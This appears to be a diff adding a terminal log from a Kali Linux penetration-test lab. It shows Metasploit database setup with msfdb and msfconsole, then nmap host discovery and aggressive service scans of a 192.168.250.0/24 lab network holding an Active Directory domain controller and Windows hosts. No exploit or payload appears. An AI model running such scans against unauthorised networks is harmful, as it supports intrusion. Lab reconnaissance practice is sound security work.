@@ -1,0 +1,1349 @@
+﻿┌──(pt㉿cnt-pt-1)-[~]
+└─$ sudo apt install postgresql 
+postgresql is already the newest version (18+286).
+postgresql set to manually installed.
+Summary:                    
+  Upgrading: 0, Installing: 0, Removing: 0, Not Upgrading: 4
+                                                                                                                                                                                
+┌──(pt㉿cnt-pt-1)-[~]
+└─$ sudo systemctl start postgresql
+                                                                                                                                                                                
+┌──(pt㉿cnt-pt-1)-[~]
+└─$ sudo systemctl status postgresql  
+● postgresql.service - PostgreSQL RDBMS
+     Loaded: loaded (/usr/lib/systemd/system/postgresql.service; disabled; preset: disabled)
+     Active: active (exited) since Fri 2026-01-30 14:31:56 +07; 6s ago
+ Invocation: 8323133867714f2cb429b6146fd5c7b2
+    Process: 28598 ExecStart=/bin/true (code=exited, status=0/SUCCESS)
+   Main PID: 28598 (code=exited, status=0/SUCCESS)
+   Mem peak: 2M
+        CPU: 10ms
+
+Jan 30 14:31:56 cnt-pt-1 systemd[1]: Starting postgresql.service - PostgreSQL RDBMS...
+Jan 30 14:31:56 cnt-pt-1 systemd[1]: Finished postgresql.service - PostgreSQL RDBMS.
+                                                                                                                                                                                
+┌──(pt㉿cnt-pt-1)-[~]
+└─$ sudo systemctl enable postgresql
+Synchronizing state of postgresql.service with SysV service script with /usr/lib/systemd/systemd-sysv-install.
+Executing: /usr/lib/systemd/systemd-sysv-install enable postgresql
+Created symlink '/etc/systemd/system/multi-user.target.wants/postgresql.service' → '/usr/lib/systemd/system/postgresql.service'.
+
+---
+
+┌──(pt㉿cnt-pt-1)-[~]
+└─$ sudo msfdb init  
+[i] Database already started
+[+] Creating database user 'msf'
+[+] Creating databases 'msf'
+┏━(Message from Kali developers)
+┃
+┃ This is a minimal installation of Kali Linux, you likely
+┃ want to install supplementary tools. Learn how:
+┃ ⇒ https://www.kali.org/docs/troubleshooting/common-minimum-setup/
+┃
+┗━(Run: “touch ~/.hushlogin” to hide this message)
+[+] Creating databases 'msf_test'
+┏━(Message from Kali developers)
+┃
+┃ This is a minimal installation of Kali Linux, you likely
+┃ want to install supplementary tools. Learn how:
+┃ ⇒ https://www.kali.org/docs/troubleshooting/common-minimum-setup/
+┃
+┗━(Run: “touch ~/.hushlogin” to hide this message)
+[+] Creating configuration file '/usr/share/metasploit-framework/config/database.yml'
+[+] Creating initial database schema
+                                                                                                                                                                                
+┌──(pt㉿cnt-pt-1)-[~]
+└─$ msfconsole -q
+msf > db_status
+[*] Connected to msf. Connection type: postgresql.
+msf > hosts
+
+Hosts
+=====
+
+address  mac  name  os_name  os_flavor  os_sp  purpose  info  comments
+-------  ---  ----  -------  ---------  -----  -------  ----  --------
+
+msf > services
+Services
+========
+
+host  port  proto  name  state  info
+----  ----  -----  ----  -----  ----
+
+msf > 
+
+---
+
+┌──(pt㉿cnt-pt-1)-[~]
+└─$ sudo msfdb delete                                                                          
+[i] Database already started
+[+] Dropping databases 'msf'
+┏━(Message from Kali developers)
+┃
+┃ This is a minimal installation of Kali Linux, you likely
+┃ want to install supplementary tools. Learn how:
+┃ ⇒ https://www.kali.org/docs/troubleshooting/common-minimum-setup/
+┃
+┗━(Run: “touch ~/.hushlogin” to hide this message)
+[+] Dropping databases 'msf_test'
+┏━(Message from Kali developers)
+┃
+┃ This is a minimal installation of Kali Linux, you likely
+┃ want to install supplementary tools. Learn how:
+┃ ⇒ https://www.kali.org/docs/troubleshooting/common-minimum-setup/
+┃
+┗━(Run: “touch ~/.hushlogin” to hide this message)
+[+] Dropping database user 'msf'
+┏━(Message from Kali developers)
+┃
+┃ This is a minimal installation of Kali Linux, you likely
+┃ want to install supplementary tools. Learn how:
+┃ ⇒ https://www.kali.org/docs/troubleshooting/common-minimum-setup/
+┃
+┗━(Run: “touch ~/.hushlogin” to hide this message)
+[+] Deleting configuration file /usr/share/metasploit-framework/config/database.yml
+[+] Stopping database
+                                                                                                                                                                                
+┌──(pt㉿cnt-pt-1)-[~]
+└─$ 
+
+---
+
+┌──(pt㉿cnt-pt-1)-[~]
+└─$ sudo msfdb reinit
+[i] Database already started
+[+] Dropping databases 'msf'
+┏━(Message from Kali developers)
+┃
+┃ This is a minimal installation of Kali Linux, you likely
+┃ want to install supplementary tools. Learn how:
+┃ ⇒ https://www.kali.org/docs/troubleshooting/common-minimum-setup/
+┃
+┗━(Run: “touch ~/.hushlogin” to hide this message)
+[+] Dropping databases 'msf_test'
+┏━(Message from Kali developers)
+┃
+┃ This is a minimal installation of Kali Linux, you likely
+┃ want to install supplementary tools. Learn how:
+┃ ⇒ https://www.kali.org/docs/troubleshooting/common-minimum-setup/
+┃
+┗━(Run: “touch ~/.hushlogin” to hide this message)
+[+] Dropping database user 'msf'
+┏━(Message from Kali developers)
+┃
+┃ This is a minimal installation of Kali Linux, you likely
+┃ want to install supplementary tools. Learn how:
+┃ ⇒ https://www.kali.org/docs/troubleshooting/common-minimum-setup/
+┃
+┗━(Run: “touch ~/.hushlogin” to hide this message)
+[+] Deleting configuration file /usr/share/metasploit-framework/config/database.yml
+[+] Stopping database
+[+] Starting database
+[+] Creating database user 'msf'
+[+] Creating databases 'msf'
+┏━(Message from Kali developers)
+┃
+┃ This is a minimal installation of Kali Linux, you likely
+┃ want to install supplementary tools. Learn how:
+┃ ⇒ https://www.kali.org/docs/troubleshooting/common-minimum-setup/
+┃
+┗━(Run: “touch ~/.hushlogin” to hide this message)
+[+] Creating databases 'msf_test'
+┏━(Message from Kali developers)
+┃
+┃ This is a minimal installation of Kali Linux, you likely
+┃ want to install supplementary tools. Learn how:
+┃ ⇒ https://www.kali.org/docs/troubleshooting/common-minimum-setup/
+┃
+┗━(Run: “touch ~/.hushlogin” to hide this message)
+[+] Creating configuration file '/usr/share/metasploit-framework/config/database.yml'
+[+] Creating initial database schema
+
+---
+
+┌──(pt㉿cnt-pt-1)-[~]
+└─$ sudo msfdb status
+● postgresql.service - PostgreSQL RDBMS
+     Loaded: loaded (/usr/lib/systemd/system/postgresql.service; enabled; preset: disabled)
+     Active: active (exited) since Fri 2026-01-30 15:46:14 +07; 1min 18s ago
+ Invocation: 3b47c5f453b546d794fc88c5b6e84585
+    Process: 33169 ExecStart=/bin/true (code=exited, status=0/SUCCESS)
+   Main PID: 33169 (code=exited, status=0/SUCCESS)
+   Mem peak: 2M
+        CPU: 10ms
+
+Jan 30 15:46:14 cnt-pt-1 systemd[1]: Starting postgresql.service - PostgreSQL RDBMS...
+Jan 30 15:46:14 cnt-pt-1 systemd[1]: Finished postgresql.service - PostgreSQL RDBMS.
+
+COMMAND    PID     USER FD   TYPE DEVICE SIZE/OFF NODE NAME
+postgres 33134 postgres 6u  IPv6 201867      0t0  TCP localhost:5432 (LISTEN)
+postgres 33134 postgres 7u  IPv4 201868      0t0  TCP localhost:5432 (LISTEN)
+
+UID          PID    PPID  C STIME TTY      STAT   TIME CMD
+postgres   33134       1  0 15:46 ?        Ss     0:00 /usr/lib/postgresql/16/bin/postgres -D /var/lib/postgresql/16/main -c config_file=/etc/postgresql/16/main/postgresql.conf
+
+[+] Detected configuration file (/usr/share/metasploit-framework/config/database.yml)
+
+---
+
+
+msf > db_nmap -sn 192.168.250.0/24
+[*] Nmap: Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-30 15:53 +0700
+[*] Nmap: Nmap scan report for 192.168.250.250
+[*] Nmap: Host is up (0.00044s latency).
+[*] Nmap: MAC Address: BC:24:11:A2:86:1F (Proxmox Server Solutions GmbH)
+[*] Nmap: Nmap scan report for 192.168.250.251
+[*] Nmap: Host is up (0.00044s latency).
+[*] Nmap: MAC Address: BC:24:11:0F:70:87 (Proxmox Server Solutions GmbH)
+[*] Nmap: Nmap scan report for 192.168.250.252
+[*] Nmap: Host is up (0.00041s latency).
+[*] Nmap: MAC Address: BC:24:11:69:0E:45 (Proxmox Server Solutions GmbH)
+[*] Nmap: Nmap scan report for 192.168.250.254
+[*] Nmap: Host is up (0.00042s latency).
+[*] Nmap: MAC Address: BC:24:11:06:94:0C (Proxmox Server Solutions GmbH)
+[*] Nmap: Nmap scan report for 192.168.250.100
+[*] Nmap: Host is up.
+[*] Nmap: Nmap done: 256 IP addresses (5 hosts up) scanned in 8.95 seconds
+msf > hosts
+
+Hosts
+=====
+
+address          mac                name  os_name  os_flavor  os_sp  purpose  info  comments
+-------          ---                ----  -------  ---------  -----  -------  ----  --------
+192.168.250.100
+192.168.250.250  BC:24:11:A2:86:1F
+192.168.250.251  BC:24:11:0F:70:87
+192.168.250.252  BC:24:11:69:0E:45
+192.168.250.254  BC:24:11:06:94:0C
+
+msf > 
+
+
+---
+
+msf > db_nmap -A 192.168.250.0/24
+[*] Nmap: Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-30 16:28 +0700
+[*] Nmap: Nmap scan report for 192.168.250.250
+[*] Nmap: Host is up (0.00044s latency).
+[*] Nmap: Not shown: 986 filtered tcp ports (no-response)
+[*] Nmap: PORT     STATE SERVICE       VERSION
+[*] Nmap: 53/tcp   open  domain        Simple DNS Plus
+[*] Nmap: 88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-01-30 09:29:20Z)
+[*] Nmap: 135/tcp  open  msrpc         Microsoft Windows RPC
+[*] Nmap: 139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+[*] Nmap: 389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: contoso.lab, Site: Default-First-Site-Name)
+[*] Nmap: | ssl-cert: Subject: commonName=cnt-adc-1.contoso.lab
+[*] Nmap: | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:cnt-adc-1.contoso.lab
+[*] Nmap: | Not valid before: 2025-08-25T09:21:48
+[*] Nmap: |_Not valid after:  2026-08-25T09:21:48
+[*] Nmap: |_ssl-date: TLS randomness does not represent time
+[*] Nmap: 445/tcp  open  microsoft-ds?
+[*] Nmap: 464/tcp  open  kpasswd5?
+[*] Nmap: 593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+[*] Nmap: 636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: contoso.lab, Site: Default-First-Site-Name)
+[*] Nmap: | ssl-cert: Subject: commonName=cnt-adc-1.contoso.lab
+[*] Nmap: | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:cnt-adc-1.contoso.lab
+[*] Nmap: | Not valid before: 2025-08-25T09:21:48
+[*] Nmap: |_Not valid after:  2026-08-25T09:21:48
+[*] Nmap: |_ssl-date: TLS randomness does not represent time
+[*] Nmap: 3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: contoso.lab, Site: Default-First-Site-Name)
+[*] Nmap: |_ssl-date: TLS randomness does not represent time
+[*] Nmap: | ssl-cert: Subject: commonName=cnt-adc-1.contoso.lab
+[*] Nmap: | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:cnt-adc-1.contoso.lab
+[*] Nmap: | Not valid before: 2025-08-25T09:21:48
+[*] Nmap: |_Not valid after:  2026-08-25T09:21:48
+[*] Nmap: 3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: contoso.lab, Site: Default-First-Site-Name)
+[*] Nmap: |_ssl-date: TLS randomness does not represent time
+[*] Nmap: | ssl-cert: Subject: commonName=cnt-adc-1.contoso.lab
+[*] Nmap: | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:cnt-adc-1.contoso.lab
+[*] Nmap: | Not valid before: 2025-08-25T09:21:48
+[*] Nmap: |_Not valid after:  2026-08-25T09:21:48
+[*] Nmap: 3389/tcp open  ms-wbt-server Microsoft Terminal Services
+[*] Nmap: |_ssl-date: 2026-01-30T09:31:02+00:00; -2s from scanner time.
+[*] Nmap: | ssl-cert: Subject: commonName=cnt-adc-1.contoso.lab
+[*] Nmap: | Not valid before: 2026-01-19T05:05:43
+[*] Nmap: |_Not valid after:  2026-07-21T05:05:43
+[*] Nmap: | rdp-ntlm-info:
+[*] Nmap: |   Target_Name: CONTOSO
+[*] Nmap: |   NetBIOS_Domain_Name: CONTOSO
+[*] Nmap: |   NetBIOS_Computer_Name: CNT-ADC-1
+[*] Nmap: |   DNS_Domain_Name: contoso.lab
+[*] Nmap: |   DNS_Computer_Name: cnt-adc-1.contoso.lab
+[*] Nmap: |   DNS_Tree_Name: contoso.lab
+[*] Nmap: |   Product_Version: 10.0.20348
+[*] Nmap: |_  System_Time: 2026-01-30T09:30:20+00:00
+[*] Nmap: 5357/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+[*] Nmap: |_http-title: Service Unavailable
+[*] Nmap: |_http-server-header: Microsoft-HTTPAPI/2.0
+[*] Nmap: 5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+[*] Nmap: |_http-server-header: Microsoft-HTTPAPI/2.0
+[*] Nmap: |_http-title: Not Found
+[*] Nmap: MAC Address: BC:24:11:A2:86:1F (Proxmox Server Solutions GmbH)
+[*] Nmap: Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+[*] Nmap: Device type: general purpose
+[*] Nmap: Running (JUST GUESSING): Microsoft Windows 2022|11|2016 (97%)
+[*] Nmap: OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_11 cpe:/o:microsoft:windows_server_2016
+[*] Nmap: Aggressive OS guesses: Microsoft Windows Server 2022 (97%), Microsoft Windows 11 21H2 (91%), Microsoft Windows Server 2016 (91%)
+[*] Nmap: No exact OS matches for host (test conditions non-ideal).
+[*] Nmap: Network Distance: 1 hop
+[*] Nmap: Service Info: Host: CNT-ADC-1; OS: Windows; CPE: cpe:/o:microsoft:windows
+[*] Nmap: Host script results:
+[*] Nmap: |_clock-skew: mean: -2s, deviation: 0s, median: -2s
+[*] Nmap: |_nbstat: NetBIOS name: CNT-ADC-1, NetBIOS user: <unknown>, NetBIOS MAC: bc:24:11:a2:86:1f (Proxmox Server Solutions GmbH)
+[*] Nmap: | smb2-time:
+[*] Nmap: |   date: 2026-01-30T09:30:20
+[*] Nmap: |_  start_date: N/A
+[*] Nmap: | smb2-security-mode:
+[*] Nmap: |   3.1.1:
+[*] Nmap: |_    Message signing enabled and required
+[*] Nmap: TRACEROUTE
+[*] Nmap: HOP RTT     ADDRESS
+[*] Nmap: 1   0.44 ms 192.168.250.250
+[*] Nmap: Nmap scan report for 192.168.250.251
+[*] Nmap: Host is up (0.00040s latency).
+[*] Nmap: Not shown: 994 filtered tcp ports (no-response)
+[*] Nmap: PORT     STATE SERVICE       VERSION
+[*] Nmap: 135/tcp  open  msrpc         Microsoft Windows RPC
+[*] Nmap: 139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+[*] Nmap: 445/tcp  open  microsoft-ds?
+[*] Nmap: 3389/tcp open  ms-wbt-server Microsoft Terminal Services
+[*] Nmap: |_ssl-date: 2026-01-30T09:31:02+00:00; -2s from scanner time.
+[*] Nmap: | ssl-cert: Subject: commonName=cnt-srv-1.contoso.lab
+[*] Nmap: | Not valid before: 2026-01-19T05:06:09
+[*] Nmap: |_Not valid after:  2026-07-21T05:06:09
+[*] Nmap: | rdp-ntlm-info:
+[*] Nmap: |   Target_Name: CONTOSO
+[*] Nmap: |   NetBIOS_Domain_Name: CONTOSO
+[*] Nmap: |   NetBIOS_Computer_Name: CNT-SRV-1
+[*] Nmap: |   DNS_Domain_Name: contoso.lab
+[*] Nmap: |   DNS_Computer_Name: cnt-srv-1.contoso.lab
+[*] Nmap: |   Product_Version: 10.0.20348
+[*] Nmap: |_  System_Time: 2026-01-30T09:30:20+00:00
+[*] Nmap: 5357/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+[*] Nmap: |_http-server-header: Microsoft-HTTPAPI/2.0
+[*] Nmap: |_http-title: Service Unavailable
+[*] Nmap: 5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+[*] Nmap: |_http-title: Not Found
+[*] Nmap: |_http-server-header: Microsoft-HTTPAPI/2.0
+[*] Nmap: MAC Address: BC:24:11:0F:70:87 (Proxmox Server Solutions GmbH)
+[*] Nmap: Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+[*] Nmap: Device type: general purpose
+[*] Nmap: Running (JUST GUESSING): Microsoft Windows 2022|11|2016 (97%)
+[*] Nmap: OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_11 cpe:/o:microsoft:windows_server_2016
+[*] Nmap: Aggressive OS guesses: Microsoft Windows Server 2022 (97%), Microsoft Windows 11 21H2 (91%), Microsoft Windows Server 2016 (91%)
+[*] Nmap: No exact OS matches for host (test conditions non-ideal).
+[*] Nmap: Network Distance: 1 hop
+[*] Nmap: Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+[*] Nmap: Host script results:
+[*] Nmap: |_clock-skew: mean: -2s, deviation: 0s, median: -2s
+[*] Nmap: |_nbstat: NetBIOS name: CNT-SRV-1, NetBIOS user: <unknown>, NetBIOS MAC: bc:24:11:0f:70:87 (Proxmox Server Solutions GmbH)
+[*] Nmap: | smb2-security-mode:
+[*] Nmap: |   3.1.1:
+[*] Nmap: |_    Message signing enabled but not required
+[*] Nmap: | smb2-time:
+[*] Nmap: |   date: 2026-01-30T09:30:20
+[*] Nmap: |_  start_date: N/A
+[*] Nmap: TRACEROUTE
+[*] Nmap: HOP RTT     ADDRESS
+[*] Nmap: 1   0.40 ms 192.168.250.251
+[*] Nmap: Nmap scan report for 192.168.250.252
+[*] Nmap: Host is up (0.00038s latency).
+[*] Nmap: Not shown: 996 filtered tcp ports (no-response)
+[*] Nmap: PORT     STATE SERVICE       VERSION
+[*] Nmap: 135/tcp  open  msrpc         Microsoft Windows RPC
+[*] Nmap: 139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+[*] Nmap: 445/tcp  open  microsoft-ds?
+[*] Nmap: 3389/tcp open  ms-wbt-server Microsoft Terminal Services
+[*] Nmap: |_ssl-date: 2026-01-30T09:31:02+00:00; -2s from scanner time.
+[*] Nmap: | ssl-cert: Subject: commonName=cnt-wks-1.contoso.lab
+[*] Nmap: | Not valid before: 2025-09-19T05:52:18
+[*] Nmap: |_Not valid after:  2026-03-21T05:52:18
+[*] Nmap: | rdp-ntlm-info:
+[*] Nmap: |   Target_Name: CONTOSO
+[*] Nmap: |   NetBIOS_Domain_Name: CONTOSO
+[*] Nmap: |   NetBIOS_Computer_Name: CNT-WKS-1
+[*] Nmap: |   DNS_Domain_Name: contoso.lab
+[*] Nmap: |   DNS_Computer_Name: cnt-wks-1.contoso.lab
+[*] Nmap: |   Product_Version: 10.0.19041
+[*] Nmap: |_  System_Time: 2026-01-30T09:30:18+00:00
+[*] Nmap: MAC Address: BC:24:11:69:0E:45 (Proxmox Server Solutions GmbH)
+[*] Nmap: Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+[*] Nmap: Device type: general purpose
+[*] Nmap: Running (JUST GUESSING): Microsoft Windows 10|11|2019 (97%)
+[*] Nmap: OS CPE: cpe:/o:microsoft:windows_10 cpe:/o:microsoft:windows_11 cpe:/o:microsoft:windows_server_2019
+[*] Nmap: Aggressive OS guesses: Microsoft Windows 10 1803 (97%), Microsoft Windows 10 1903 - 21H1 (97%), Microsoft Windows 11 (94%), Microsoft Windows 10 1909 (91%), Microsoft Windows 10 1909 - 2004 (91%), Windows Server 2019 (91%), Microsoft Windows 10 1809 (91%), Microsoft Windows 10 20H2 (88%)
+[*] Nmap: No exact OS matches for host (test conditions non-ideal).
+[*] Nmap: Network Distance: 1 hop
+[*] Nmap: Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+[*] Nmap: Host script results:
+[*] Nmap: | smb2-security-mode:
+[*] Nmap: |   3.1.1:
+[*] Nmap: |_    Message signing enabled but not required
+[*] Nmap: |_nbstat: NetBIOS name: CNT-WKS-1, NetBIOS user: <unknown>, NetBIOS MAC: bc:24:11:69:0e:45 (Proxmox Server Solutions GmbH)
+[*] Nmap: | smb2-time:
+[*] Nmap: |   date: 2026-01-30T09:30:22
+[*] Nmap: |_  start_date: N/A
+[*] Nmap: |_clock-skew: mean: -2s, deviation: 0s, median: -2s
+[*] Nmap: TRACEROUTE
+[*] Nmap: HOP RTT     ADDRESS
+[*] Nmap: 1   0.38 ms 192.168.250.252
+[*] Nmap: Nmap scan report for 192.168.250.254
+[*] Nmap: Host is up (0.00032s latency).
+[*] Nmap: Not shown: 990 closed tcp ports (reset)
+[*] Nmap: PORT     STATE SERVICE       VERSION
+[*] Nmap: 42/tcp   open  tcpwrapped
+[*] Nmap: 53/tcp   open  domain        Simple DNS Plus
+[*] Nmap: 80/tcp   open  http          Microsoft IIS httpd 10.0
+[*] Nmap: | http-methods:
+[*] Nmap: |_  Potentially risky methods: TRACE
+[*] Nmap: |_http-server-header: Microsoft-IIS/10.0
+[*] Nmap: |_http-title: IIS Windows Server
+[*] Nmap: 135/tcp  open  msrpc         Microsoft Windows RPC
+[*] Nmap: 139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+[*] Nmap: 445/tcp  open  microsoft-ds  Windows Server 2022 Datacenter 20348 microsoft-ds
+[*] Nmap: 1688/tcp open  msrpc         Microsoft Windows RPC
+[*] Nmap: 3389/tcp open  ms-wbt-server Microsoft Terminal Services
+[*] Nmap: |_ssl-date: 2026-01-30T09:31:04+00:00; 0s from scanner time.
+[*] Nmap: | rdp-ntlm-info:
+[*] Nmap: |   Target_Name: OLYMP
+[*] Nmap: |   NetBIOS_Domain_Name: OLYMP
+[*] Nmap: |   NetBIOS_Computer_Name: OLM-SRV-GW-1
+[*] Nmap: |   DNS_Domain_Name: olymp.dom
+[*] Nmap: |   DNS_Computer_Name: olm-srv-gw-1.olymp.dom
+[*] Nmap: |   DNS_Tree_Name: olymp.dom
+[*] Nmap: |   Product_Version: 10.0.20348
+[*] Nmap: |_  System_Time: 2026-01-30T09:30:24+00:00
+[*] Nmap: | ssl-cert: Subject: commonName=olm-srv-gw-1.olymp.dom
+[*] Nmap: | Not valid before: 2025-12-16T16:18:22
+[*] Nmap: |_Not valid after:  2026-06-17T16:18:22
+[*] Nmap: 5357/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+[*] Nmap: |_http-server-header: Microsoft-HTTPAPI/2.0
+[*] Nmap: |_http-title: Service Unavailable
+[*] Nmap: 5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+[*] Nmap: |_http-server-header: Microsoft-HTTPAPI/2.0
+[*] Nmap: |_http-title: Not Found
+[*] Nmap: MAC Address: BC:24:11:06:94:0C (Proxmox Server Solutions GmbH)
+[*] Nmap: Device type: general purpose
+[*] Nmap: Running: Microsoft Windows 2022
+[*] Nmap: OS CPE: cpe:/o:microsoft:windows_server_2022
+[*] Nmap: OS details: Microsoft Windows Server 2022
+[*] Nmap: Network Distance: 1 hop
+[*] Nmap: Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
+[*] Nmap: Host script results:
+[*] Nmap: | smb2-time:
+[*] Nmap: |   date: 2026-01-30T09:30:24
+[*] Nmap: |_  start_date: N/A
+[*] Nmap: |_clock-skew: mean: -1h23m59s, deviation: 3h07m47s, median: 0s
+[*] Nmap: | smb-os-discovery:
+[*] Nmap: |   OS: Windows Server 2022 Datacenter 20348 (Windows Server 2022 Datacenter 6.3)
+[*] Nmap: |   Computer name: olm-srv-gw-1
+[*] Nmap: |   NetBIOS computer name: OLM-SRV-GW-1\x00
+[*] Nmap: |   Domain name: olymp.dom
+[*] Nmap: |   Forest name: olymp.dom
+[*] Nmap: |   FQDN: olm-srv-gw-1.olymp.dom
+[*] Nmap: |_  System time: 2026-01-30T16:30:24+07:00
+[*] Nmap: | smb-security-mode:
+[*] Nmap: |   account_used: guest
+[*] Nmap: |   authentication_level: user
+[*] Nmap: |   challenge_response: supported
+[*] Nmap: |_  message_signing: disabled (dangerous, but default)
+[*] Nmap: |_nbstat: NetBIOS name: OLM-SRV-GW-1, NetBIOS user: <unknown>, NetBIOS MAC: bc:24:11:06:94:0c (Proxmox Server Solutions GmbH)
+[*] Nmap: | smb2-security-mode:
+[*] Nmap: |   3.1.1:
+[*] Nmap: |_    Message signing enabled but not required
+[*] Nmap: TRACEROUTE
+[*] Nmap: HOP RTT     ADDRESS
+[*] Nmap: 1   0.32 ms 192.168.250.254
+[*] Nmap: Nmap scan report for 192.168.250.100
+[*] Nmap: Host is up (0.000047s latency).
+[*] Nmap: Not shown: 999 filtered tcp ports (no-response)
+[*] Nmap: PORT     STATE SERVICE VERSION
+[*] Nmap: 5999/tcp open  vnc     RealVNC Enterprise 5.3 or later (protocol 5.0)
+[*] Nmap: Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+[*] Nmap: Device type: general purpose
+[*] Nmap: Running: Linux 5.X|6.X
+[*] Nmap: OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:linux:linux_kernel:6
+[*] Nmap: OS details: Linux 5.0 - 6.2
+[*] Nmap: Network Distance: 0 hops
+[*] Nmap: Post-scan script results:
+[*] Nmap: | clock-skew:
+[*] Nmap: |   -2s:
+[*] Nmap: |     192.168.250.251
+[*] Nmap: |     192.168.250.250
+[*] Nmap: |_    192.168.250.252
+[*] Nmap: OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+[*] Nmap: Nmap done: 256 IP addresses (5 hosts up) scanned in 246.28 seconds
+/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/recog-3.1.25/lib/recog/fingerprint/regexp_factory.rb:34: warning: nested repeat operator '+' and '?' was replaced with '*' in regular expression
+msf > hosts
+
+Hosts
+=====
+
+address          mac                name  os_name       os_flavor  os_sp  purpose  info  comments
+-------          ---                ----  -------       ---------  -----  -------  ----  --------
+192.168.250.100                           Linux                    5.X    server
+192.168.250.250  bc:24:11:a2:86:1f        Windows 2022                    server
+192.168.250.251  bc:24:11:0f:70:87        Windows 2022                    server
+192.168.250.252  bc:24:11:69:0e:45        Windows 10                      client
+192.168.250.254  bc:24:11:06:94:0c        Windows 2022                    server
+
+msf > services
+Services
+========
+
+host             port  proto  name           state  info
+----             ----  -----  ----           -----  ----
+192.168.250.100  5999  tcp    vnc            open   RealVNC Enterprise 5.3 or later protocol 5.0
+192.168.250.250  53    tcp    domain         open   Simple DNS Plus
+192.168.250.250  88    tcp    kerberos-sec   open   Microsoft Windows Kerberos server time: 2026-01-30 09:29:20Z
+192.168.250.250  135   tcp    msrpc          open   Microsoft Windows RPC
+192.168.250.250  139   tcp    netbios-ssn    open   Microsoft Windows netbios-ssn
+192.168.250.250  389   tcp    ldap           open   Microsoft Windows Active Directory LDAP Domain: contoso.lab, Site: Default-First-Site-Name
+192.168.250.250  445   tcp    microsoft-ds   open
+192.168.250.250  464   tcp    kpasswd5       open
+192.168.250.250  593   tcp    ncacn_http     open   Microsoft Windows RPC over HTTP 1.0
+192.168.250.250  636   tcp    ssl/ldap       open   Microsoft Windows Active Directory LDAP Domain: contoso.lab, Site: Default-First-Site-Name
+192.168.250.250  3268  tcp    ldap           open   Microsoft Windows Active Directory LDAP Domain: contoso.lab, Site: Default-First-Site-Name
+192.168.250.250  3269  tcp    ssl/ldap       open   Microsoft Windows Active Directory LDAP Domain: contoso.lab, Site: Default-First-Site-Name
+192.168.250.250  3389  tcp    ms-wbt-server  open   Microsoft Terminal Services
+192.168.250.250  5357  tcp    http           open   Microsoft HTTPAPI httpd 2.0 SSDP/UPnP
+192.168.250.250  5985  tcp    http           open   Microsoft HTTPAPI httpd 2.0 SSDP/UPnP
+192.168.250.251  135   tcp    msrpc          open   Microsoft Windows RPC
+192.168.250.251  139   tcp    netbios-ssn    open   Microsoft Windows netbios-ssn
+192.168.250.251  445   tcp    microsoft-ds   open
+192.168.250.251  3389  tcp    ms-wbt-server  open   Microsoft Terminal Services
+192.168.250.251  5357  tcp    http           open   Microsoft HTTPAPI httpd 2.0 SSDP/UPnP
+192.168.250.251  5985  tcp    http           open   Microsoft HTTPAPI httpd 2.0 SSDP/UPnP
+192.168.250.252  135   tcp    msrpc          open   Microsoft Windows RPC
+192.168.250.252  139   tcp    netbios-ssn    open   Microsoft Windows netbios-ssn
+192.168.250.252  445   tcp    microsoft-ds   open
+192.168.250.252  3389  tcp    ms-wbt-server  open   Microsoft Terminal Services
+192.168.250.254  42    tcp    tcpwrapped     open
+192.168.250.254  53    tcp    domain         open   Simple DNS Plus
+192.168.250.254  80    tcp    http           open   Microsoft IIS httpd 10.0
+192.168.250.254  135   tcp    msrpc          open   Microsoft Windows RPC
+192.168.250.254  139   tcp    netbios-ssn    open   Microsoft Windows netbios-ssn
+192.168.250.254  445   tcp    microsoft-ds   open   Windows Server 2022 Datacenter 20348 microsoft-ds
+192.168.250.254  1688  tcp    msrpc          open   Microsoft Windows RPC
+192.168.250.254  3389  tcp    ms-wbt-server  open   Microsoft Terminal Services
+192.168.250.254  5357  tcp    http           open   Microsoft HTTPAPI httpd 2.0 SSDP/UPnP
+192.168.250.254  5985  tcp    http           open   Microsoft HTTPAPI httpd 2.0 SSDP/UPnP
+
+msf > 
+
+
+---
+
+msf > hosts
+
+Hosts
+=====
+
+address          mac                name  os_name       os_flavor  os_sp  purpose  info  comments
+-------          ---                ----  -------       ---------  -----  -------  ----  --------
+192.168.250.100                           Linux                    5.X    server
+192.168.250.250  bc:24:11:a2:86:1f        Windows 2022                    server
+192.168.250.251  bc:24:11:0f:70:87        Windows 2022                    server
+192.168.250.252  bc:24:11:69:0e:45        Windows 10                      client
